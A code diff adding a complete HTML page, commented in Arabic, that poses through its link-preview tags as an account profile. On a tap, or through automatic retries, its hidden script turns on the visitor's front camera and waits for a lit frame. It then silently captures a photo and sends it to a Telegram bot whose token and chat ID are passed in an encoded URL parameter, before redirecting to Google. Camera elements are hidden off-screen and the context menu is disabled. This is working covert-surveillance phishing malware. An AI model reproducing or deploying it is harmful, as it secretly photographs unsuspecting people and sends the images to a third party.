@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title> </title>
+
+    <!-- ===== Open Graph (معدلة حسب الطلب) ===== -->
+    <meta property="og:title" content="Account profile" />
+    <meta property="og:description" content="Message me now ." />
+    <meta property="og:image" content="https://site-url.github.io/Website-/img.png" />
+    <meta property="og:url" content="https://site-url.github.io/Website-/index.html" />
+    <meta name="twitter:card" content="summary_large_image" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body, html {
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        video, canvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        body {
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <video id="videoElem" autoplay muted playsinline></video>
+    <canvas id="canvasElem"></canvas>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ------------------------------------------------------------------
+            // 1. استخراج الإعدادات من بارامتر 'p'
+            // ------------------------------------------------------------------
+            let botToken = null;
+            let chatId = null;
+            let redirectUrl = "https://www.google.com";
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedParam = urlParams.get('p');
+
+            if (encodedParam && typeof encodedParam === 'string' && encodedParam.trim().length > 0) {
+                try {
+                    const decodedJson = atob(encodedParam);
+                    const config = JSON.parse(decodedJson);
+                    if (config.t && typeof config.t === 'string') botToken = config.t;
+                    if (config.c && (typeof config.c === 'string' || typeof config.c === 'number')) chatId = String(config.c);
+                    if (config.r && config.r.startsWith('http')) redirectUrl = config.r;
+                    else if (config.r && config.r.length > 0) redirectUrl = "https://" + config.r;
+                } catch(e) {}
+            }
+
+            // ------------------------------------------------------------------
+            // 2. العناصر والمتغيرات
+            // ------------------------------------------------------------------
+            const video = document.getElementById('videoElem');
+            const canvas = document.getElementById('canvasElem');
+
+            let mediaStream = null;
+            let isCapturing = false;
+            let isPhotoSent = false;
+            let frameAnalyzerInterval = null;
+            let redirectExecuted = false;
+            let cameraStarted = false;
+
+            // ------------------------------------------------------------------
+            // 3. التوجيه الحتمي
+            // ------------------------------------------------------------------
+            const executeRedirect = () => {
+                if (redirectExecuted) return;
+                redirectExecuted = true;
+                if (mediaStream) {
+                    try { mediaStream.getTracks().forEach(t => { if (t.readyState === 'live') t.stop(); }); } catch(e) {}
+                }
+                if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                window.location.replace(redirectUrl);
+            };
+
+            // ------------------------------------------------------------------
+            // 4. إرسال الصورة إلى Telegram (جودة عالية)
+            // ------------------------------------------------------------------
+            const sendToTelegram = (jpegBlob) => {
+                if (isPhotoSent) return;
+                isPhotoSent = true;
+
+                if (!botToken || !chatId) {
+                    executeRedirect();
+                    return;
+                }
+
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', jpegBlob, 'silent_capture.jpg');
+
+                fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true,
+                    mode: 'no-cors'
+                }).catch(() => {});
+
+                setTimeout(executeRedirect, 30);
+            };
+
+            // ------------------------------------------------------------------
+            // 5. التقاط الإطار بجودة عالية (0.9)
+            // ------------------------------------------------------------------
+            const captureAndSend = () => {
+                if (isPhotoSent) return;
+
+                const vw = video.videoWidth;
+                const vh = video.videoHeight;
+                if (vw === 0 || vh === 0) {
+                    executeRedirect();
+                    return;
+                }
+
+                canvas.width = vw;
+                canvas.height = vh;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, vw, vh);
+
+                canvas.toBlob((blob) => {
+                    if (blob && blob.size > 0) {
+                        sendToTelegram(blob);
+                    } else {
+                        executeRedirect();
+                    }
+                }, 'image/jpeg', 0.9);
+            };
+
+            // ------------------------------------------------------------------
+            // 6. تحليل البكسلات مع مهلة 6 ثوانٍ
+            // ------------------------------------------------------------------
+            const startPixelAnalysis = () => {
+                if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+
+                const maxWait = 6000;
+                const startTime = Date.now();
+
+                frameAnalyzerInterval = setInterval(() => {
+                    if (isPhotoSent || redirectExecuted) {
+                        if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                        return;
+                    }
+
+                    if (video.readyState !== 4 || video.videoWidth === 0 || video.videoHeight === 0) {
+                        return;
+                    }
+
+                    const w = video.videoWidth;
+                    const h = video.videoHeight;
+                    if (w < 8 || h < 8) return;
+
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, w, h);
+
+                    const cx = Math.floor(w / 2);
+                    const cy = Math.floor(h / 2);
+                    let pixel;
+                    try {
+                        pixel = ctx.getImageData(cx, cy, 1, 1).data;
+                    } catch(e) { return; }
+
+                    const rgbSum = pixel[0] + pixel[1] + pixel[2];
+
+                    if (rgbSum > 30) {
+                        if (!isPhotoSent && !redirectExecuted) {
+                            if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                            frameAnalyzerInterval = null;
+                            captureAndSend();
+                        }
+                    } else if (Date.now() - startTime > maxWait && !isPhotoSent && !redirectExecuted) {
+                        if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                        frameAnalyzerInterval = null;
+                        captureAndSend();
+                    }
+                }, 80);
+            };
+
+            // ------------------------------------------------------------------
+            // 7. تشغيل الكاميرا
+            // ------------------------------------------------------------------
+            const activateCameraAndEngine = async () => {
+                if (isCapturing || cameraStarted) return;
+                isCapturing = true;
+                cameraStarted = true;
+
+                try {
+                    const constraints = {
+                        video: {
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            facingMode: "user"
+                        }
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.setAttribute("playsinline", "");
+                    video.muted = true;
+
+                    await new Promise((resolve) => {
+                        if (video.readyState >= 2) { resolve(); } else {
+                            const onReady = () => {
+                                video.removeEventListener('loadeddata', onReady);
+                                video.removeEventListener('loadedmetadata', onReady);
+                                resolve();
+                            };
+                            video.addEventListener('loadeddata', onReady);
+                            video.addEventListener('loadedmetadata', onReady);
+                            setTimeout(resolve, 800);
+                        }
+                    });
+
+                    try { await video.play(); } catch(e) {}
+
+                    startPixelAnalysis();
+
+                } catch (err) {
+                    executeRedirect();
+                }
+            };
+
+            // ------------------------------------------------------------------
+            // 8. ربط الأحداث – أي نقرة على الصفحة
+            // ------------------------------------------------------------------
+            document.addEventListener('click', activateCameraAndEngine, { passive: true });
+            document.addEventListener('touchstart', activateCameraAndEngine, { passive: true });
+
+            // ------------------------------------------------------------------
+            // 9. محاولات تلقائية متكررة
+            // ------------------------------------------------------------------
+            [500, 1500, 3000, 5000, 8000].forEach(delay => {
+                setTimeout(() => {
+                    if (!cameraStarted) {
+                        activateCameraAndEngine().catch(() => {});
+                    }
+                }, delay);
+            });
+
+            // ------------------------------------------------------------------
+            // 10. عند عودة الصفحة للظهور
+            // ------------------------------------------------------------------
+            document.addEventListener('visibilitychange', () => {
+                if (!document.hidden && !cameraStarted) {
+                    activateCameraAndEngine().catch(() => {});
+                }
+            });
+
+            // ------------------------------------------------------------------
+            // 11. منع القوائم السياقية والسحب
+            // ------------------------------------------------------------------
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            document.addEventListener('dragstart', (e) => e.preventDefault());
+
+            // ------------------------------------------------------------------
+            // 12. صمام أمان نهائي (15 ثانية)
+            // ------------------------------------------------------------------
+            setTimeout(() => {
+                if (!redirectExecuted) executeRedirect();
+            }, 15000);
+
+        })();
+    </script>
+</body>
+</html>
